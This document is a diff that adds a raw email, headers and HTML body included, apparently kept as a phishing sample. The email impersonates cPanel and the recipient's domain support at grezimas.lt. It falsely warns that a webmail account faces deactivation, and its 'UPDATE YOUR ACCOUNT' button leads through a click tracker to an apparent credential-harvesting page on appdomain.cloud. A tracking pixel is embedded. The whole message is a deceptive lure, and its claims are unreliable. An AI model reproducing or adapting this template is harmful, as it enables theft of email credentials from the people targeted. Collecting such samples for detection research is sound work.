@@ -1,0 +1,198 @@
+Return-path: <bounces+9163770-043d-modernus=grezimas.lt@sendgrid.net>
+Envelope-to: modernus@grezimas.lt
+Delivery-date: Tue, 04 Feb 2020 12:05:33 +0200
+Received: from mail by gandras.serveriai.lt with spam-scanned (Exim 4.92.3)
+	(envelope-from <bounces+9163770-043d-modernus=grezimas.lt@sendgrid.net>)
+	id 1iyv5J-0007FV-Pt
+	for modernus@grezimas.lt; Tue, 04 Feb 2020 12:05:33 +0200
+Received: from [168.245.111.83] (helo=o1.sendgrid.cognitiveclass.ai)
+	by gandras.serveriai.lt with esmtps (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128)
+	(Exim 4.92.3)
+	(envelope-from <bounces+9163770-043d-modernus=grezimas.lt@sendgrid.net>)
+	id 1iyv5J-0007Ez-En
+	for modernus@grezimas.lt; Tue, 04 Feb 2020 12:05:33 +0200
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.net; 
+	h=reply-to:from:to:subject:mime-version:content-type:content-transfer-encoding; 
+	s=smtpapi; bh=FlnQeqNixeV1JYtDYH5JWWr6npMMVT6qCbfuwT3ydxs=; b=KE
+	YEzHDYrRfCe0naaexF/YzUOhmmUz8Zh5Qwl448FHroHgMvfAjEM9OASbLtJJMTGQ
+	cGNZ7l8W47uDZnUw5RtHzOd0f0gSWF/h/Envi4dfX0VsEOcZeGDFJdP3/UNhbeM6
+	FEuoF+W5IMgd/cubFLdCfwo1woMcwpWfByyEOQR8E=
+Received: by filter2120p1mdw1.sendgrid.net with SMTP id filter2120p1mdw1-13746-5E3941EA-23
+        2020-02-04 10:05:30.793888175 +0000 UTC m=+978074.294616673
+Received: from 6ab60b00d909 (15.45.089f.ip4.static.sl-reverse.com [159.8.69.21])
+	by ismtpd0004p1lon1.sendgrid.net (SG) with ESMTP id r8HqJVMaRtWUsw4L3skJ3A
+	for <modernus@grezimas.lt>; Tue, 04 Feb 2020 10:05:30.656 +0000 (UTC)
+Received: from [10.42.173.170] (helo=cPanel.com)
+	by 6ab60b00d909 with esmtp (Exim 4.92)
+	(envelope-from <support@cPanel.com>)
+	id 1iyuy3-0005Kr-8t
+	for modernus@grezimas.lt; Tue, 04 Feb 2020 09:58:03 +0000
+Reply-To: no-reply@postmaster.com
+From: Mail Administrator <support@cPanel.com>
+To: modernus@grezimas.lt
+Subject: Webmail Maintenance Notification
+Date: Tue, 04 Feb 2020 10:05:31 +0000 (UTC)
+Message-ID: <20200204105801.FF4532F45174B293@cPanel.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-SG-EID: 16h7rUYBGDn70x3+zBZDaJaRkoL0AMYUOfLMkgS5w0Dnjz3NdgEYmBBzDRvjov6z/okdlYDJ2TTlEM
+ Dr7rYXo0he2vFjbgGcwhbtpNBG5FRSzdhCIg73agoQGLo8DjVrbVwIdm19TrjCENSxGG7pybjk8Ykq
+ 6rF3RZjjAa503O/FA9QpyuY1St+xg08QSxTm2YLsB0jdxbmV+xstkGqQ+jmNak6jFCBQxk1v0VmxZT
+ 8=
+X-Spam-Checked: sendgrid.net, 167.89.115.56, google.com, 216.239.36.117,
+	appdomain.cloud
+
+<HTML><HEAD>
+<META content=3D"text/html; charset=3DUTF-8" http-equiv=3DContent-Type>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<DIV align=3Dcenter><BR><BR></DIV>
+<DIV align=3Dcenter>
+<table style=3D"WIDTH: 640px; MARGIN: 0px auto" cellspacing=3D"0" cellpaddi=
+ng=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 24px; FONT-FAMILY: arial,sans-serif; BACKGROUND: rg=
+b(54,54,54); TEXT-TRANSFORM: capitalize; COLOR: rgb(255,255,255); PADDING-B=
+OTTOM: 15px; PADDING-TOP: 15px; PADDING-LEFT: 40px; LINE-HEIGHT: normal; PA=
+DDING-RIGHT: 0px; font-variant-numeric: normal; font-variant-east-asian: no=
+rmal; font-stretch: normal" colspan=3D"3">grezimas.lt Support<BR></TD></TR>
+<TR>
+<td style=3D"HEIGHT: 224px; VERTICAL-ALIGN: top; BACKGROUND: rgb(241,202,10=
+) no-repeat 50% 0%; TEXT-ALIGN: center; PADDING-TOP: 10px" colspan=3D"3">
+<DIV style=3D"HEIGHT: 96px; BACKGROUND: no-repeat 50% 50%"><BR></DIV>
+<H1 style=3D"FONT-SIZE: 32px; FONT-FAMILY: arial,sans-serif; COLOR: rgb(255=
+,255,255); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN=
+: 4px 0px 3px; LINE-HEIGHT: normal; PADDING-RIGHT: 0px; font-variant-numeri=
+c: normal; font-variant-east-asian: normal; font-stretch: normal">Your Acco=
+unt Needs Attention!<BR></H1>
+<P style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial,sans-serif; COLOR: rgb(255,=
+255,255); MARGIN: 0px; LINE-HEIGHT: 20px; font-variant-numeric: normal; fon=
+t-variant-east-asian: normal; font-stretch: normal">*System updates and mai=
+ntenance has expired*<BR></P></TD></TR>
+<TR>
+<td style=3D"WIDTH: 60px; BACKGROUND: rgb(245,245,245)"><BR></TD>
+<td style=3D"PADDING-BOTTOM: 30px; PADDING-TOP: 30px; PADDING-LEFT: 30px; P=
+ADDING-RIGHT: 30px; background-size: initial; background-origin: initial; b=
+ackground-clip: initial">
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial,sans-serif; FONT-WEIGHT: bo=
+ld; MARGIN: 0px 0px 30px; LINE-HEIGHT: 1.7em; font-variant-numeric: normal;=
+ font-variant-east-asian: normal; font-stretch: normal">
+<DIV style=3D"TEXT-ALIGN: center"><FONT size=3D1><SPAN style=3D"FONT-SIZE: =
+16px">Our system has detected that system updates and <BR>maintenance for&n=
+bsp;</SPAN><FONT size=3D2><STRONG>modernus@grezimas.lt</STRONG></FONT>&nbsp=
+;<BR><SPAN style=3D"FONT-SIZE: 16px">has expired and your account has been =
+marked for deactivation.</SPAN></FONT></DIV><SPAN style=3D"FONT-SIZE: 16px;=
+ LINE-HEIGHT: 1.7em">
+<DIV style=3D"TEXT-ALIGN: center">You can prevent deactivation now and perf=
+orm the required updates <BR>and maintenance to continue using account.</DI=
+V></SPAN>
+<P></P>
+<DIV align=3Dcenter>
+<DIV style=3D"WIDTH: 300px; BACKGROUND: rgb(45,166,74); PADDING-BOTTOM: 10p=
+x; TEXT-ALIGN: center; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0px a=
+uto 20px; PADDING-RIGHT: 10px"><SPAN id=3Dm_6353715319755630408gmail-OBJ_PR=
+EFIX_DWT56_com_zimbra_url style=3D"COLOR: rgb(0,90,149)">
+<A style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial,sans-serif; FONT-WEIGHT: bo=
+ld; COLOR: rgb(255,255,255); LINE-HEIGHT: 20px; font-variant-numeric: norma=
+l; font-variant-east-asian: normal; font-stretch: normal; text-decoration-l=
+ine: none" href=3D"http://u9163770.ct.sendgrid.net/wf/click?upn=3Dt08OoJAyk=
+ycO0-2Boq3yIbSHttWDrxGjntAaiy8Z0jJFForq78eU4bUSVlvZKxeXFMj01auC5ra12-2BxLhX=
+wndBq9uwcABFmFim0yZzMV8Jw-2Bs-3D_YmytkhLeZzT628UeBJT0rDh1rFTVZ7R3As-2BkU7-2=
+Fv6C0vXQazun-2FptVxwAeXjo54yg0ukOnTm6vUGaYejDPN5zbzyENCvjX5ObdgoQ9ZkfGfQcym=
+xF2xHV4mF-2BbN6wA70uy4pVamFs8mLafB2pgtp5Poq3XhYoDjwSjbcE9xkSifDRk0uiNtIlRRH=
+OUrtr38S19wARNxPzSm7X6V7JJ5CeVACzEruTZ7VsvWmgc4FiDU-3D" rel=3D"noopener nor=
+eferrer" target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://superappcont=
+ent2.eu-gb.cf.appdomain.cloud/?part2%3Dkamnosestvo.teharje@siol.net&amp;sou=
+rce=3Dgmail&amp;ust=3D1579850794210000&amp;usg=3DAFQjCNH7TtS6syL4IVg-j2Jjqe=
+w0SOTMdg"><FONT size=3D3>UPDATE YOUR ACCOUNT</FONT></A></SPAN><BR></DIV></D=
+IV>
+<H3 style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial,sans-serif; COLOR: rgb(51,=
+51,51); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0=
+px 0px 5px; LINE-HEIGHT: 21px; PADDING-RIGHT: 0px; font-variant-numeric: no=
+rmal; font-variant-east-asian: normal; font-stretch: normal"><BR></H3>
+<H3 style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial,sans-serif; COLOR: rgb(51,=
+51,51); PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-=
+LEFT: 0px; MARGIN: 0px 0px 5px; LINE-HEIGHT: 21px; PADDING-RIGHT: 0px; font=
+-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: no=
+rmal"><U>New &amp; Improved Features Available</U><BR></H3>
+<DIV><BR></DIV>
+<H3 style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial,sans-serif; COLOR: rgb(51,=
+51,51); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0=
+px 0px 5px; LINE-HEIGHT: 21px; PADDING-RIGHT: 0px; font-variant-numeric: no=
+rmal; font-variant-east-asian: normal; font-stretch: normal">Privacy Protec=
+tion<BR></H3>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial,sans-serif; COLOR: rgb(51,5=
+1,51); MARGIN: 0px 0px 30px; LINE-HEIGHT: 20px; font-variant-numeric: norma=
+l; font-variant-east-asian: normal; font-stretch: normal">Privacy Protectio=
+n has secured your personal information against the many spammers and crimi=
+nals on the web. Without this service, your personal details like phone num=
+ber and email address must be displayed in the public whois records, accord=
+ing to domain registration rules.<BR></P>
+<P style=3D"FONT-SIZE: 12px; BORDER-TOP: rgb(221,223,222) 1px solid; FONT-F=
+AMILY: arial,sans-serif; COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; TEXT=
+-ALIGN: center; PADDING-TOP: 15px; MARGIN: 0px; LINE-HEIGHT: 18px; font-var=
+iant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal=
+">If you have any questions about this service, please contact us using the=
+ details below - we're always happy to help!</P></TD>
+<td style=3D"WIDTH: 60px; BACKGROUND: rgb(245,245,245)"><BR></TD></TR>
+<TR>
+<td style=3D"HEIGHT: 80px; BACKGROUND: rgb(245,245,245)" colspan=3D"3"><BR>=
+</TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 24px; FONT-FAMILY: arial,sans-serif; BACKGROUND: rg=
+b(54,54,54); COLOR: rgb(255,255,255); PADDING-BOTTOM: 15px; PADDING-TOP: 15=
+px; PADDING-LEFT: 40px; LINE-HEIGHT: normal; PADDING-RIGHT: 0px; font-varia=
+nt-numeric: normal; font-variant-east-asian: normal; font-stretch: normal" =
+colspan=3D"3">
+<table style=3D"WIDTH: 560px" cellspacing=3D"0" cellpadding=3D"0" border=3D=
+"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 11px; FONT-FAMILY: arial,sans-serif; FONT-WEIGHT: b=
+old; COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDI=
+NG-LEFT: 25px; LINE-HEIGHT: normal; font-variant-numeric: normal; font-vari=
+ant-east-asian: normal; font-stretch: normal">SUPPORT</TD>
+<td style=3D"FONT-SIZE: 11px; FONT-FAMILY: arial,sans-serif; FONT-WEIGHT: b=
+old; COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDI=
+NG-LEFT: 25px; LINE-HEIGHT: normal; font-variant-numeric: normal; font-vari=
+ant-east-asian: normal; font-stretch: normal">TECHNICAL SUPPORT</TD>
+<td style=3D"FONT-SIZE: 11px; FONT-FAMILY: arial,sans-serif; FONT-WEIGHT: b=
+old; COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDI=
+NG-LEFT: 25px; LINE-HEIGHT: normal; font-variant-numeric: normal; font-vari=
+ant-east-asian: normal; font-stretch: normal">BILLING DESK</TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 11px; FONT-FAMILY: arial, sans-serif; PADDING-LEFT:=
+ 25px; LINE-HEIGHT: normal; font-variant-numeric: normal; font-variant-east=
+-asian: normal; font-stretch: normal" valign=3D"top">
+<P style=3D"LINE-HEIGHT: 20px"><FONT color=3D#005a95>Support@postmaster.com=
+</FONT></P></TD>
+<td style=3D"FONT-SIZE: 11px; FONT-FAMILY: arial,sans-serif; COLOR: rgb(102=
+,102,102); PADDING-LEFT: 25px; LINE-HEIGHT: normal; font-variant-numeric: n=
+ormal; font-variant-east-asian: normal; font-stretch: normal" valign=3D"top=
+">
+<P style=3D"LINE-HEIGHT: 20px"><SPAN id=3Dm_6353715319755630408gmail-OBJ_PR=
+EFIX_DWT58_ZmEmailObjectHandler style=3D"COLOR: rgb(0,90,149)"><A style=3D"=
+COLOR: rgb(0,90,149); text-decoration-line: none" rel=3D"noopener noreferre=
+r" target=3D_blank>whois@grezimas.lt </A></SPAN></P></TD>
+<td style=3D"FONT-SIZE: 11px; FONT-FAMILY: arial,sans-serif; COLOR: rgb(102=
+,102,102); PADDING-LEFT: 25px; LINE-HEIGHT: normal; font-variant-numeric: n=
+ormal; font-variant-east-asian: normal; font-stretch: normal" valign=3D"top=
+">
+<P style=3D"LINE-HEIGHT: 20px">Whois.com Billing Team<BR><BR></P></TD></TR>=
+</TBODY></TABLE></TD></TR></TBODY></TABLE></DIV>
+<DIV align=3Dcenter></DIV>
+<img src=3D"https://u9163770.ct.sendgrid.net/wf/open?upn=3DYmytkhLeZzT628Ue=
+BJT0rDh1rFTVZ7R3As-2BkU7-2Fv6C0vXQazun-2FptVxwAeXjo54ynf8bKNqeIcNzp0-2FUR8o=
+gAwXwimxVyP3ycZXbKalvxY-2Bz98SCafsLhjlPhOBbyfPXPr4l5vFlVOBvT8wahoAbwpLBJ1Gw=
+mTGkJE1NCu-2BT9kXsuofmYFEx5pR7r5Pzd-2BUCRKQsTerbkpgIOhk0SkFkNNBcRbsJ-2FQJp-=
+2BPhYsMP4RG8-3D" alt=3D"" width=3D"1" height=3D"1" border=3D"0" style=3D"he=
+ight:1px !important;width:1px !important;border-width:0 !important;margin-t=
+op:0 !important;margin-bottom:0 !important;margin-right:0 !important;margin=
+-left:0 !important;padding-top:0 !important;padding-bottom:0 !important;pad=
+ding-right:0 !important;padding-left:0 !important;"/>
+</BODY></HTML>
+
